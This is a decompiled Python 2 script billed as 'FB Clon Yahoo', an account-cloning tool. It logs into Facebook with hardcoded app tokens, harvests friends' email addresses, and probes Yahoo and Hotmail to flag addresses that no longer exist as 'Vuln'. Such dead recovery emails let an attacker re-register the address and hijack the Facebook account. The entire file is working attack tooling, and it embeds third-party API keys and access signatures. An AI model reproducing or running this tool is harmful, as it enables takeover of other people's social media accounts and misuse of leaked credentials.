
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Source File : cloning.py
# Time : Sat Aug 22 08:00:53 2020
#---------------------------------------
# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <debby>
import requests, json, os, re, sys, mechanize, urllib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system('clear')
import time, os, random
sleep = time.sleep
import platform, os

def tampil(x):
    w = {'m': 31, 'h': 32, 'k': 33, 'b': 34, 'p': 35, 'c': 36}
    for i in w:
        x = x.replace('\r%s' % i, '\x1b[%s;1m' % w[i])

    x += '\x1b[0m'
    x = x.replace('\r0', '\x1b[0m')
    print x


tampil('\rh\n          ___   ___   _  _   \n         | __| | _ ) | || |  \rk*\rcAsecC|~|eror404\n         | _|  | _ \\ | __ |  \n        _|_|_  |___/ |_||_|  \n \rp |"""""|| """ |\rmHaxID\rp|"""""||"""""| \n      "`-0-0-\'"`-0-0-\'"`-0-0-\'   \n      \n\rmKita semua bangkit dan berdiri untuk suatu perubahan\n\rc####################################################\n             \rh*\rpFB Clon Yahoo\rh*\n             \t\t\n \rhAuthor :\x1b[36;1m AsecC\rm|~|\rheror404\n \rhTeam   :\x1b[36;1m Hax\rhID\n \rhContact:\x1b[36;1m sempakbasah\rm044\rh@gmail.com\n \n\rc####################################################\n\rmNOTE:Sekali anda memahami, seribu kali anda mengerti')
tampil('')
tampil('')
tampil('\rc#\rpLogin dulu bosq\rk*')
idt = raw_input('\x1b[32;1m[\x1b[31m*\x1b[32;1m] \x1b[36;1mEmail/No ponsel   : ')
passw = raw_input('\x1b[32;1m[\x1b[31m*\x1b[32;1m] \x1b[36;1mPassword: ')
url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idt + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
data = urllib.urlopen(url)
op = json.load(data)
if 'access_token' in op:
    token = op['access_token']
    print '\x1b[32;1m[\x1b[31m+\x1b[36;1m] Mantap login sukses\x1b[32;1m*'
else:
    print '\x1b[32;1m[\x1b[31m+\x1b[32;1m] \x1b[31mlogin gagal bosq silahkan coba lagi\x1b[32;1m*!'
    sys.exit()
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
hasil = json.loads(get_friends.text)
print '\x1b[32;1m[\x1b[31m+\x1b[32;1m] Berhasil Mendapatkan ID Teman anda...'
print '\x1b[32;1m[\x1b[31m+\x1b[32;1m] Hasil Cloning\x1b[31;1m*'

def defense():
    global h
    global o
    o = []
    h = 0
    print '\x1b[32;1m' + 55 * '-'
    print '\x1b[34;1m# ' + '           ' + '\x1b[32;1mEmail Yahoo' + '              ' + '\x1b[34;1m#' + '         ' + '\x1b[32;1mVuln bosq\x1b[32;1m*' + '        ' + '\x1b[34;1m#'
    print 55 * '-'
    for i in hasil['data']:
        wrna = '\x1b[36m'
        wrne = '\x1b[39m'
        h += 1
        o.append(h)
        x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
        z = json.loads(x.text)
        try:
            kunci = re.compile('@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = z['email']
                j = br.submit().read()
                Zen = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = '      ' + '\x1b[31mNot Vuln bosq\x1b[32;1m*'
                    lean = 30 - len(z['email'])
                    eml = lean * ' '
                    lone = 24 - len(vuln)
                    namel = lone * ' '
                    print '\x1b[34;1m# ' + wrna + z['email'] + eml + '\x1b[34;1m# ' + wrne + vuln + namel + ' \x1b[34;1m#'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = '        ' + '\x1b[32;1mVuln bosq\x1b[32;1m*'
                else:
                    vuln = '     ' + '\x1b[31;1mNot Vuln bodq\x1b[33;1m*'
                lean = 30 - len(z['email'])
                eml = lean * ' '
                lone = 24 - len(vuln)
                namel = lone * ' '
                print '\x1b[34;1m# ' + wrna + z['email'] + eml + '\x1b[34;1m# ' + wrne + vuln + namel + ' \x1b[34;1m#'
            elif 'hotmail' in cari:
                url = 'http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=' + z['email'] + '&smtp=1&format=1'
                cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                    vuln = '        ' + '\x1b[32;1mVuln bosq\x1b[32;1m*'
                else:
                    vuln = '     ' + '\x1b[31mNot Vuln bosq\x1b[32;1m*'
                lean = 30 - len(z['email'])
                eml = lean * ' '
                lone = 24 - len(vuln)
                namel = lone * ' '
                print '\x1b[34;1m# ' + wrna + z['email'] + eml + '\x1b[34;1m#  ' + wrne + vuln + namel + '\x1b[34;1m#'
        except KeyError:
            pass


defense()